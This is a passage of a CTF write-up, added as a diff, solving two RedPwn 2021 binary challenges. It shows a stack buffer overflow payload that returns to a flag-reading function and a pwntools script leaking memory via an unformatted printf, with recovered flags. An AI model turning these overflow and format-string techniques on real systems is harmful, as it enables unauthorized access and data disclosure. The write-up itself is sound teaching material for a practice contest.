@@ -449,3 +449,510 @@ darkcoder
 ...and indeed we have a shell. Pass it to the remote server, run `ls; cat flag.txt` and the flag is ours.
 
 ##### Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
+
+### pwn/ret2generic-flag-reader
+
+---
+
+#### Categeory: Binary Exploit
+
+#### Difficulty: Easy
+
+#### Keywords: Buffer Overflow, Binary Exploit
+
+#### Author: TheRealDarkCoder
+
+#### Prompt:>
+
+```
+i'll ace this board meeting with my new original challenge!
+
+nc mc.ax 31077
+```
+
+#### Overview:>
+
+1. We have an ELF executable, the source code and a netcat port to connect to at a server. Running the binary prompts the following
+
+```
+❯ nc mc.ax 31077
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+AABBCCDD
+```
+
+2. Examining the source code, we find there are two functions, `main()` and `super_generic_flag_reading_function_please_ret_to_me()`. The second one looks like this
+  
+```c
+void super_generic_flag_reading_function_please_ret_to_me()
+{
+  char flag[0x100] = {0};
+  FILE *fp = fopen("./flag.txt", "r");
+  if (!fp)
+  {
+    puts("no flag!! contact a member of rob inc");
+    exit(-1);
+  }
+  fgets(flag, 0xff, fp);
+  puts(flag);
+  fclose(fp);
+}
+```
+
+From my understanding, the function allocates 256 bytes (0x100 in hex) for the flag and fills it with 0s. It then uses `fopen()` to read a flag.txt file and `fgets()` the content into the allocated storage.
+
+3. We take a look at the `main()` function
+
+```c
+int main(void)
+{
+  char comments_and_concerns[32];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts("alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...");
+  puts("how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!");
+  puts("slap on some flavortext and there's no way rob will fire me now!");
+  puts("this is genius!! what do you think?");
+
+  gets(comments_and_concerns);
+}
+```
+
+...again, `gets()` used to get user input, however nothing is done with the userinput. So obviously another buffer overflow.
+
+4. The attack plan is simple. We need to overwrite some return pointers so that the `main()` function returns to call the `super_generic_flag_reading_function_please_ret_to_me()` function which prints the flag.
+
+5. We create a demo `flag.txt` file and fill it with some "Z"s to simulate the server.
+
+6. We run the given binary with `gdb` and disassemble the `main()` function first,
+
+```asm
+...
+
+0x00000000004013e8 <+67>:    call   0x4010c0 <setbuf@plt>
+   0x00000000004013ed <+72>:    lea    rdi,[rip+0xc4c]        # 0x402040
+   0x00000000004013f4 <+79>:    call   0x4010a0 <puts@plt>
+   0x00000000004013f9 <+84>:    lea    rdi,[rip+0xca0]        # 0x4020a0
+   0x0000000000401400 <+91>:    call   0x4010a0 <puts@plt>
+   0x0000000000401405 <+96>:    lea    rdi,[rip+0xd0c]        # 0x402118
+   0x000000000040140c <+103>:   call   0x4010a0 <puts@plt>
+   0x0000000000401411 <+108>:   lea    rdi,[rip+0xd48]        # 0x402160
+   0x0000000000401418 <+115>:   call   0x4010a0 <puts@plt>
+   0x000000000040141d <+120>:   lea    rax,[rbp-0x20]
+   0x0000000000401421 <+124>:   mov    rdi,rax
+   0x0000000000401424 <+127>:   call   0x4010e0 <gets@plt>
+   0x0000000000401429 <+132>:   mov    eax,0x0
+   0x000000000040142e <+137>:   leave
+   0x000000000040142f <+138>:   ret
+```
+
+Nothing unusual, we spot the `puts()` and the `gets()` and then the program exits. We disassemble the other function too,
+
+```asm
+Dump of assembler code for function super_generic_flag_reading_function_please_ret_to_me:
+   0x00000000004011f6 <+0>:     endbr64
+   0x00000000004011fa <+4>:     push   rbp
+   0x00000000004011fb <+5>:     mov    rbp,rsp
+   0x00000000004011fe <+8>:     sub    rsp,0x110
+   0x0000000000401205 <+15>:    mov    QWORD PTR [rbp-0x110],0x0
+   0x0000000000401210 <+26>:    mov    QWORD PTR [rbp-0x108],0x0
+   0x000000000040121b <+37>:    mov    QWORD PTR [rbp-0x100],0x0
+   ...
+
+   0x0000000000401333 <+317>:   mov    QWORD PTR [rbp-0x18],0x0
+   0x000000000040133b <+325>:   lea    rsi,[rip+0xcc6]        # 0x402008
+   0x0000000000401342 <+332>:   lea    rdi,[rip+0xcc1]        # 0x40200a
+   0x0000000000401349 <+339>:   call   0x4010f0 <fopen@plt>
+   0x000000000040134e <+344>:   mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000401352 <+348>:   cmp    QWORD PTR [rbp-0x8],0x0
+   0x0000000000401357 <+353>:   jne    0x40136f <super_generic_flag_reading_function_please_ret_to_me+377>
+   0x0000000000401359 <+355>:   lea    rdi,[rip+0xcb8]        # 0x402018
+   0x0000000000401360 <+362>:   call   0x4010a0 <puts@plt>
+   0x0000000000401365 <+367>:   mov    edi,0xffffffff
+   0x000000000040136a <+372>:   call   0x401100 <exit@plt>
+   0x000000000040136f <+377>:   mov    rdx,QWORD PTR [rbp-0x8]
+   0x0000000000401373 <+381>:   lea    rax,[rbp-0x110]
+   0x000000000040137a <+388>:   mov    esi,0xff
+   0x000000000040137f <+393>:   mov    rdi,rax
+   0x0000000000401382 <+396>:   call   0x4010d0 <fgets@plt>
+   0x0000000000401387 <+401>:   lea    rax,[rbp-0x110]
+   0x000000000040138e <+408>:   mov    rdi,rax
+   0x0000000000401391 <+411>:   call   0x4010a0 <puts@plt>
+   0x0000000000401396 <+416>:   mov    rax,QWORD PTR [rbp-0x8]
+   0x000000000040139a <+420>:   mov    rdi,rax
+   0x000000000040139d <+423>:   call   0x4010b0 <fclose@plt>
+   0x00000000004013a2 <+428>:   nop
+   0x00000000004013a3 <+429>:   leave
+   0x00000000004013a4 <+430>:   ret
+End of assembler dump.
+```
+
+...Looks like the function starts at address `0x00000000004011f6`. So we need to return to `0x00000000004011f6` from `main()` somehow. 
+
+
+7. We run the program normally and use python to print out a bunch of `A` until we get a segfault. In this case, 40 A's gave us a segmentation fault. We use `dmesg | tail` to figure out what's going on.
+  
+```
+❯ python2 -c "print('A'*40)" | ./ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+[1]    19478 done                python2 -c "print('A'*40)" |
+       19479 segmentation fault  ./ret2generic-flag-reader
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_ret2generic-flag-reader │ pwn ?1 ▓▒░────────░▒▓ 0|SEGV х │ 12:16:17 PM
+❯ dmesg | tail
+[328909.667233] ret2generic-fla[19857]: segfault at 7f848d7b14d0 ip 00007f848d7b14d0 sp 00007ffe88da9538 error 15
+[328909.667236] Code: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 <00> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+```
+
+So we have a segfault at 7f848d7b14d0. Let's write 41 As and see what happens to that address.
+
+```
+[328992.779647] ret2generic-fla[19868]: segfault at 7fbe2f150041 ip 00007fbe2f150041 sp 00007fff48f61740 error 15 in libc-2.31.so[7fbe2f131000+25000]
+```
+
+Looks like our A's are overflowing the address where segfault is occuring, that is, where the program is trying to return too. 
+
+8. So all we have to do, is replace `7fbe2f150041` in the dmesg with the address pointer of our flag printer function, and instead of a Segfault the `main()` will actually return there, because unlike `7fbe2f150041`, that address, specifically `0x00000000004011f6` (found from the disassembly) actually exists.
+
+
+9. So we have to write 40A's or NoOps and then fill the next 6 bytes with `0000004011f6`
+
+```py
+python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')"
+```
+
+Due to endianness, we have to write the bytes upside down. Again I chose to go with python2 because of easier output as bytes. Pipe the output to our local binary,
+
+```
+❯ python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" | ./ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+ZZZZZZZZZZZZZZZZZZ
+
+[1]    19503 done                python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" |
+       19504 segmentation fault  ./ret2generic-flag-reader
+```
+
+...and boom we have our Z's. Now we pipe the output to the server,
+
+```
+❯ python2 -c "print('A'*40 + '\xf6\x11\x40\x00\x00\x00')" | nc mc.ax 31077
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
+```
+
+and we have our flag.
+
+##### Flag: flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
+
+### pwn/printf-please
+
+---
+
+#### Categeory: Binary Exploit
+
+#### Difficulty: Medium
+
+#### Keywords: Binary Exploit, Format String Exploit, printf
+
+#### Author: TheRealDarkCoder
+
+#### Prompt:>
+
+```
+Be sure to say please...
+
+nc mc.ax 31569
+
+```
+
+#### Overview:>
+
+1. We have a port to connect to, a ELF executable and a source code. Running the binary/connecting to the port prompts the following behaviour
+
+```sh
+❯ ./please
+what do you say?
+AABBCCDD
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 4s │ 12:29:09 PM
+❯ ./please
+what do you say?
+please
+please to you too!
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:29:12 PM
+❯ ./please
+what do you say?
+please AABBCCDD
+please AABBCCDD to you too!
+```
+
+So if we give any input after the keyword `please`, the program reflects it back to us.
+
+2. We take a look at the source code, only one `main()` function,
+
+```c
+int main(void)
+{
+  char buffer[0x200];
+  char flag[0x200];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  memset(buffer, 0, sizeof(buffer));
+  memset(flag, 0, sizeof(flag));
+
+  int fd = open("flag.txt", O_RDONLY);
+  if (fd == -1) {
+    puts("failed to read flag. please contact an admin if this is remote");
+    exit(1);
+  }
+
+  read(fd, flag, sizeof(flag));
+  close(fd);
+
+  puts("what do you say?");
+
+  read(0, buffer, sizeof(buffer) - 1);
+  buffer[strcspn(buffer, "\n")] = 0;
+
+  if (!strncmp(buffer, "please", 6)) {
+    printf(buffer);
+    puts(" to you too!");
+  }
+}
+```
+
+So the prgram sets a 512 bytes allocation for the buffer and 512 bytes for the flag (0x200 = 512). It then sets the buffer and flag with 0s. The program then opens a `flag.txt` and reads the file and puts the `flag` part of the memory.
+
+The program then asks for useinput, this time using `strcspn()`, safer then `gets()` of course. So probably not a buffer overflow. But, if the userinput contains `please`, it `printf()`s the entire buffer, and there's the attack vector
+
+```c
+printf(buffer);
+```
+
+No format mentioned. So the program should be vulnerable to format string exploits. Let's try some common attacks.
+
+
+```
+❯ ./please
+what do you say?
+please %d
+please 177207190 to you too!
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:34:05 PM
+❯ ./please
+what do you say?
+please %p
+please 0x7ffe1cfe98d6 to you too!
+```
+
+We have memory leaks.
+
+
+3. We make a fake `flag.txt` file and fill it with `AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPP`s to simulate the server. Then we write a python script which iterates through some numbers and try to print the i'th pointer in memory using this vulnerability. It is to be noted, we can take the xth address from memory using the format `please %x$p`. So if we want the 70th address we can input `please %70$p`\
+
+```
+❯ ./please
+what do you say?
+please %70$p
+please 0x5a5a5a5a5a5a5a5a to you too!
+```
+
+We use pwntools in the python script
+
+```python
+from pwn import *
+
+context.log_level = 'critical'
+
+for i in range(0, 100):
+
+
+    #s = remote('mc.ax', 31569)
+    s = process('./please')
+
+    s.recvline()
+    s.sendline('please %' + str(i) + '$p')
+
+    try:
+        output = str(s.recv())
+        print(str(i) + " > " + output)
+    except:
+      #s.close()
+      s.shutdown()
+
+    #s.close()
+    s.shutdown()
+```
+
+We get this output
+
+<details>
+<summary>Output</summary>
+
+```
+❯ python3 ape.py
+ape.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline('please %' + str(i) + '$p')
+0 > b'please %0$p to you too!\n'
+1 > b'please 0x7ffc98f47bf6 to you too!\n'
+2 > b'please 0x1 to you too!\n'
+3 > b'please (nil) to you too!\n'
+4 > b'please 0x56304acf5010 to you too!\n'
+5 > b'please 0x7f2c90bafd50 to you too!\n'
+6 > b'please 0x2520657361656c70 to you too!\n'
+7 > b'please 0x702437 to you too!\n'
+8 > b'please (nil) to you too!\n'
+9 > b'please (nil) to you too!\n'
+10 > b'please (nil) to you too!\n'
+11 > b'please (nil) to you too!\n'
+12 > b'please (nil) to you too!\n'
+13 > b'please (nil) to you too!\n'
+14 > b'please (nil) to you too!\n'
+15 > b'please (nil) to you too!\n'
+16 > b'please (nil) to you too!\n'
+17 > b'please (nil) to you too!\n'
+18 > b'please (nil) to you too!\n'
+19 > b'please (nil) to you too!\n'
+20 > b'please (nil) to you too!\n'
+21 > b'please (nil) to you too!\n'
+22 > b'please (nil) to you too!\n'
+23 > b'please (nil) to you too!\n'
+24 > b'please (nil) to you too!\n'
+25 > b'please (nil) to you too!\n'
+26 > b'please (nil) to you too!\n'
+27 > b'please (nil) to you too!\n'
+28 > b'please (nil) to you too!\n'
+29 > b'please (nil) to you too!\n'
+30 > b'please (nil) to you too!\n'
+31 > b'please (nil) to you too!\n'
+32 > b'please (nil) to you too!\n'
+33 > b'please (nil) to you too!\n'
+34 > b'please (nil) to you too!\n'
+35 > b'please (nil) to you too!\n'
+36 > b'please (nil) to you too!\n'
+37 > b'please (nil) to you too!\n'
+38 > b'please (nil) to you too!\n'
+39 > b'please (nil) to you too!\n'
+40 > b'please (nil) to you too!\n'
+41 > b'please (nil) to you too!\n'
+42 > b'please (nil) to you too!\n'
+43 > b'please (nil) to you too!\n'
+44 > b'please (nil) to you too!\n'
+45 > b'please (nil) to you too!\n'
+46 > b'please (nil) to you too!\n'
+47 > b'please (nil) to you too!\n'
+48 > b'please (nil) to you too!\n'
+49 > b'please (nil) to you too!\n'
+50 > b'please (nil) to you too!\n'
+51 > b'please (nil) to you too!\n'
+52 > b'please (nil) to you too!\n'
+53 > b'please (nil) to you too!\n'
+54 > b'please (nil) to you too!\n'
+55 > b'please (nil) to you too!\n'
+56 > b'please (nil) to you too!\n'
+57 > b'please (nil) to you too!\n'
+58 > b'please (nil) to you too!\n'
+59 > b'please (nil) to you too!\n'
+60 > b'please (nil) to you too!\n'
+61 > b'please (nil) to you too!\n'
+62 > b'please (nil) to you too!\n'
+63 > b'please (nil) to you too!\n'
+64 > b'please (nil) to you too!\n'
+65 > b'please (nil) to you too!\n'
+66 > b'please (nil) to you too!\n'
+67 > b'please (nil) to you too!\n'
+68 > b'please (nil) to you too!\n'
+69 > b'please (nil) to you too!\n'
+70 > b'please 0x4444434342424141 to you too!\n'
+71 > b'please 0x4848474746464545 to you too!\n'
+72 > b'please 0x4c4c4b4b4a4a4949 to you too!\n'
+73 > b'please 0x50504f4f4e4e4d4d to you too!\n'
+74 > b'please (nil) to you too!\n'
+75 > b'please (nil) to you too!\n'
+76 > b'please (nil) to you too!\n'
+77 > b'please (nil) to you too!\n'
+78 > b'please (nil) to you too!\n'
+79 > b'please (nil) to you too!\n'
+80 > b'please (nil) to you too!\n'
+81 > b'please (nil) to you too!\n'
+82 > b'please (nil) to you too!\n'
+83 > b'please (nil) to you too!\n'
+84 > b'please (nil) to you too!\n'
+85 > b'please (nil) to you too!\n'
+86 > b'please (nil) to you too!\n'
+87 > b'please (nil) to you too!\n'
+88 > b'please (nil) to you too!\n'
+89 > b'please (nil) to you too!\n'
+90 > b'please (nil) to you too!\n'
+91 > b'please (nil) to you too!\n'
+92 > b'please (nil) to you too!\n'
+93 > b'please (nil) to you too!\n'
+94 > b'please (nil) to you too!\n'
+95 > b'please (nil) to you too!\n'
+96 > b'please (nil) to you too!\n'
+97 > b'please (nil) to you too!\n'
+98 > b'please (nil) to you too!\n'
+99 > b'please (nil) to you too!\n'
+
+```
+</details>
+
+If you observe carefully, you'll see that for i = 70 through 74, we get 0x4444434342424141, which is the hex of ASCII AABBCCDD, part of our flag. So we're pretty sure that's where our flag is. Let's write a python script to get those parts and attach them together. We also note that the bytes are reversed, probably endianness issue.
+
+4. We modify the python script. The idea is
+   1. We iterate 5 times to get the bytes for 70 to 75th pointers of the memory in the remote server.
+   2. We take the output. It's formatted as `b'please 0x4444434342424141 to you too!\n'`. So we remove the first 9 characters, and last 15 characters to isolate the value we need.
+   3. We remove the 0x and append them into a long string of all characters.
+   4. We iterate through the string, taking 2 characters each time to represent a byte and put them in `flag_bytes`
+   ```
+   flag_bytes = ["44", ""44", "43", "43", ...]
+   ```
+   5. Once we write 8 bytes, we convert it into one word and put them in flag_word. This is done because we get 8 bytes from each server connection and this helps to isolate each returns and reverse them later.
+   ```
+   flag_words = [['44', '44', '43', '43', '42', '42', '41', '41'], ['48', '48', '47', '47', '46', '46', '45', '45'], ['4c', '4c', '4b', '4b', '4a', '4a', '49', '49'], ['50', '50', '4f', '4f', '4e', '4e', '4d', '4d']]
+   ```
+
+   6. We take each word, reverse them, convert each byte into printable ASCII, put them in a list and join them to get the flag,
+
+  ```
+  flag{pl3as3_pr1ntf_w1th_caut10n_
+  ``` 
+  is what we get from the program. We don't get the last word because it's short of 3 bits. So we modify the python script to add 3 0's before the last output (before because once it's reversed it'll go to the end.)
+
+  7. Run the script and we have a flag.
+
+
+```
+❯ python3 ape.py
+ape.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline('please %' + str(i) + '$p')
+336c707b67616c66
+6e3172705f337361
+5f687431775f6674
+5f6e303174756163
+a7d6c78336139
+flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
+\x00
+```
+
+Refer to the python script for more clearance, it's not the most efficient solution but enough to explain the workflow.
+
+##### Flag: flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
